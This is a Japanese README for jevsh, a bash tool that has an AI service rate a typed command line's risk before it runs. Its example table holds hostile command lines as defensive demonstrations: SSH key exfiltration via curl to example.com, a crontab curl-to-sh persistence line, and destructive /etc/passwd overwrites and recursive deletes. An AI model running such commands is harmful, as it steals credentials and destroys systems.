# jevsh

[English](README.md) | 日本語

**`rm -rf /` が危ないことは誰でも知っています。でも、`ls -la` は単体なら無害なのに、root のシェルで `ls -la > /etc/passwd` と打つと、ユーザー情報のファイルが上書きされてしまいます。** 危険は1つのコマンドではなく、リダイレクト、パイプ、`&&` や `;` による組み合わせ方に潜んでいることが多いのです。jevsh は、打ったとおりのコマンド行全体を、実行する直前に jev に判定させます。

いつもどおりコマンドを打って、Enter の代わりに **Ctrl+Enter** を押すだけです。jev が危険度を判定し、`y` と答えればその行がそのまま実行されます。Enter だけを押したときは、今までとまったく同じです。

root のシェル（`sudo -i` のあとなど）で:

```text
# ls -la > /etc/passwd      <- Enter の代わりに Ctrl+Enter（または Ctrl+X Enter）
Command: ls -la > /etc/passwd
jev risk: CRITICAL (confidence 89%)
  LOW 0%  MEDIUM 0%  HIGH 8%  CRITICAL 92%
Run this command?
  y      run it now
  n      cancel (Enter also cancels)
[y/N]: n
Canceled. The line stays at the prompt for editing.
```

組み合わせ方によって初めて危険になるコマンド行の例です（root のシェル。jev の危険度と確信度、各1回、2026-09-26）。

| コマンド行 | jev |
|---|---|
| `ls -la` | LOW 1.00 |
| `ls -la > /etc/passwd` | CRITICAL 0.87 |
| `sort users.csv > users.csv` | HIGH 0.92 |
| `find / -name "*.log" \| xargs rm -f` | CRITICAL 0.89 |
| `cat ~/.ssh/id_ed25519 \| curl -s -X POST --data-binary @- https://example.com/upload` | CRITICAL 0.50 |
| `echo "* * * * * root curl -s http://example.com/x \| sh" >> /etc/crontab` | CRITICAL 0.89 |

jevsh は、コマンド行を AI サービス jev（TypeSafe）へ送り、危険度（LOW / MEDIUM / HIGH / CRITICAL）と確信度を表示し、`y` と答えたときだけ実行します。jev は助言するだけで、判断するのはあなたです。`jevsh COMMAND` と打つ使い方や、スクリプト向けの `jevsh --check` もあります。

## 動作環境

- bash 4.4 以降が動く Linux
- `curl`
- TypeSafe の jev API キー

jevsh は bash スクリプト1ファイルです。root 権限は不要で、ほかに何もインストールしません。

## インストール

```bash
curl -fsSLO https://raw.githubusercontent.com/takeshiue/jevsh/main/install.sh && bash install.sh
```

`install.sh` は最新のリリースをダウンロードし、`SHA256SUMS` と照合します。`ssh-keygen` があれば、jevsh のリリース用の鍵（`SHA256:LIdW6JBHIV1YvPQHU+suSOe87ZJgNZGZlfjNdl1kkKg`）による署名も確かめます。そのうえで jevsh を `~/.local/bin` に置きます。`~/.bashrc` などには触りません。`install.sh` は短いので、実行する前に中身を読むこともできます。

そのあと `jevsh` が「command not found」になる場合は、`~/.local/bin` がまだ `PATH` に入っていません。追加する行を `install.sh` が表示します。全ユーザー向けなど別の場所に入れる場合は `sudo JEVSH_INSTALL_DIR=/usr/local/bin bash install.sh` を実行します。

スクリプトをシェルへ直接流し込む（`curl ... | bash`）方法は使わないでください。ダウンロードしてから実行してください。

### install.sh を使わない場合

jevsh は1ファイルです。タグから `jevsh` と `SHA256SUMS` をダウンロードし、`sha256sum -c --ignore-missing SHA256SUMS` で確かめてから、`PATH` の通った場所に `jevsh` を置いても使えます。

## 初回の実行

初めてコマンドを評価するとき、jevsh は送信される内容を説明し、API キーを尋ねます。キーは API で使えることを確かめてから `~/.config/jevsh/config`（権限 0600）へ保存します。キーが画面に表示されることはありません。

環境変数 `JEV_API_KEY` でキーを指定することもできます。`jevsh --set-key` でいつでも登録・置き換えができます。

## 使い方

| コマンド | 何をするか |
|---|---|
| `jevsh COMMAND [ARGS...]` | COMMAND を判定して危険度を表示し、`y` と答えたときだけ実行する |
| `jevsh -c 'COMMAND LINE'` | 同じ。パイプやリダイレクトを含む行全体を判定する |
| `jevsh --check COMMAND [ARGS...]` | 判定だけを行う。結果を1行（`危険度 確信度 行`）で表示し、質問も実行もしない |
| `jevsh --check -c 'COMMAND LINE'` | 同じ。行全体を判定する |
| `jevsh --check --fail-on LEVEL ...` | さらに、危険度が LEVEL 以上なら終了ステータス 1 を返す（スクリプト向け） |
| `jevsh --yes COMMAND [ARGS...]` | 判定して結果を表示し、確認せずに実行する |
| `jevsh --no-jev COMMAND [ARGS...]` | 判定も確認もせずに実行する |
| `jevsh --set-key` | jev の API キーを登録する（置き換える） |
| `jevsh --enable-keybinding` | Ctrl+Enter / Ctrl+X Enter で判定する機能を `~/.bashrc` に追加する（事前に確認し、バックアップを残す） |
| `jevsh --disable-keybinding` | その機能を `~/.bashrc` から取り除く |
| `jevsh --init bash` | Ctrl+Enter の機能に使う bash のコードを表示する。`~/.bashrc` が実行するもので、自分で使うことはほとんどない |
| `jevsh --help` | ヘルプを表示する |
| `jevsh --version` | 版数と日付を表示する |

LEVEL は `LOW`、`MEDIUM`、`HIGH`、`CRITICAL` のいずれかです。オプションはコマンドより前に書きます。コマンド自体が `-` で始まる場合は `--` を挟みます。

コマンドを実行するのは `y` か `Y` と答えたときだけです。Enter だけを含め、それ以外の答えはすべて中止になります。

### 危険度が低いときは確認を省く

危険度の低いコマンドを `y` と答えずに実行したい場合は、`~/.bashrc` で `JEVSH_AUTO_RUN` を export します。

```bash
export JEVSH_AUTO_RUN=LOW       # LOW は確認なしで実行、MEDIUM 以上は従来どおり確認
```

`MEDIUM` にすると、LOW と MEDIUM が確認なしで実行されます。評価結果は表示され、続けて `Running without asking (...)` と表示されます。評価できなかったときは必ず確認し、端末がない場合は何も実行しません。`jevsh COMMAND` と Ctrl+Enter の両方で有効です。

### パイプとリダイレクト

`|`、`>`、`>>`、`<`、`&&`、`||`、`;` は jevsh が動く前にシェルが処理するため、jevsh にはその手前の部分しか届きません。行全体を評価するには、`-c` とシングルクォートを使います。

```bash
jevsh -c 'cat data.csv | sort > out.txt'    # 行全体を評価する
jevsh cat data.csv | sort > out.txt         # "cat data.csv" だけを評価する
```

### Ctrl+Enter で判定する

この機能を使うと、`jevsh` も引用符も打つ必要がありません。いつもどおりコマンドを打ち、Enter の代わりに **Ctrl+X Enter** を押します。パイプやリダイレクトを含む行全体が評価されます。`n` と答えると、行が入力欄に残るので、直してから実行できます。Enter だけを押したときは、今までどおり評価なしで実行されます。

jevsh は API キーを登録した直後に、この機能を `~/.bashrc` に追加するか尋ねます。いつでも追加・削除できます。

```bash
jevsh --enable-keybinding     # ~/.bashrc に目印付きのブロックを追加（事前に確認し、バックアップを残す）
jevsh --disable-keybinding    # そのブロックだけを削除
```

そのあと、新しい端末を開くか `source ~/.bashrc` を実行します。

端末が Ctrl+Enter に専用のキー列（`ESC [ 13 ; 5 u`）を送る場合は、**Ctrl+Enter** も使えます。多くの端末は Enter と同じコードを送るため、どこでも使える Ctrl+X Enter を既定にしています。たとえば Windows Terminal では、`settings.json` の `actions` と `keybindings` にそれぞれ次を追加します（既存の項目は残します）。

```json
{"command":{"action":"sendInput","input":"\u001b[13;5u"},"id":"Jevsh.AssessLine"}
{"id":"Jevsh.AssessLine","keys":"ctrl+enter"}
```

別のキーを使うには、`~/.bashrc` の jevsh のブロックより前で、`JEVSH_KEY` に Readline のキー列を設定します。

```bash
JEVSH_KEY='\C-x\C-a'
```

### スクリプトとループ

`--check` は、質問も実行もせずに評価だけを行います。出力は `危険度 確信度 行` の1行です。

```bash
$ jevsh --check find / -type f -delete
CRITICAL 1.00 find / -type f -delete
```

`--fail-on LEVEL` を付けると、危険度が LEVEL 以上のとき終了ステータス 1 を返します。

```bash
if jevsh --check --fail-on HIGH -c "$line"; then
    echo "HIGH 未満"
fi
```

1行ごとに API を1回呼ぶため、大きなループでは時間がかかり、API の利用枠も使います。

### 確認せずに実行する

- `jevsh --yes COMMAND` は、コマンドを評価して結果を表示し、確認せずに実行します。評価できなかった場合は何も実行しません（終了ステータス 3）。端末がなくても動き、その場合は結果を標準エラーに出します。
- `jevsh --no-jev COMMAND` は、評価も確認もせずに実行します。jevsh を付けずに打ったのと同じです。

`--yes` は CRITICAL のコマンドでも実行するので、注意して使ってください。危険度が低いときだけ確認を省きたい場合は、`JEVSH_AUTO_RUN` を使います。

### シェルスクリプトの中では

- Ctrl+Enter で判定する機能は、対話中の bash のプロンプトでだけ働きます。シェルスクリプトの中の行は、今までどおり評価なしで実行されます。
- スクリプトの中に `jevsh COMMAND` と書いた場合、端末から起動したスクリプトなら、その都度端末に確認が出ます。`y` と答えると実行されます。
- 端末がない場合（cron、CI、`nohup` など）は確認できないため、コマンドを実行せず終了ステータス 4 で終わります。確認されていないものを実行しないための意図した動きです。
- 自動処理では、`--check` と `--fail-on` を使い、スクリプト側で判断します。

```bash
#!/usr/bin/env bash
line='find /var/log/app -name "*.log" -mtime +30 -delete'
if jevsh --check --fail-on HIGH -c "$line"; then
    bash -c "$line"
else
    echo "skipped: risk is HIGH or above" >&2
fi
```

### 終了ステータス

| モード | ステータス |
|---|---|
| `COMMAND` / `-c` | 実行した場合はコマンド自身のステータス。2 使い方の誤り、3 API キーなし、4 中止または確認できる端末がない |
| `--check` | 0 評価できた、1 危険度が `--fail-on` 以上、2 使い方の誤り、3 評価できなかった |
| その他のオプション | 0 成功、1 失敗、2 使い方の誤り |

API に接続できない場合、jevsh はその旨を表示し、`Run without AI assessment? [y/N]` と尋ねます。既定は中止です。

## 送信される内容

コマンドを評価するとき、jevsh は TypeSafe（`https://api.typesafe.ai`）へ次を送ります。

- 打ったとおりのコマンド行（中に含まれるパスワードやトークンも含む）
- 現在のディレクトリ
- ユーザー名と Shell 名

環境からそれ以外の情報は集めません。Enter だけを押したときは何も送りません。API キーは要求のヘッダーでだけ送り、表示も記録もしません。データの扱いは TypeSafe の規約を確認してください。

## アンインストール

```bash
jevsh --disable-keybinding
rm ~/.local/bin/jevsh
rm -r ~/.config/jevsh
```

## 速さと精度

jevsh を通すと、1コマンドあたり約0.2秒増えます。そのほとんどは jev API との通信です。40のコマンド行の例では、jev の危険度が作者の予想と一致したのは、3回それぞれ40行中29〜31行でした。結果の全体と生データは [docs/benchmark.ja.md](docs/benchmark.ja.md) にあります。

## ライセンス

MIT License です。著作権表示とライセンス文を残す限り、商用を含めて自由に使用・改変・再配布できます。無保証で提供します。詳しくは [LICENSE](LICENSE) を参照してください。

## 作者

Takeshi Uematsu <takeshi.uematsu@gmail.com>
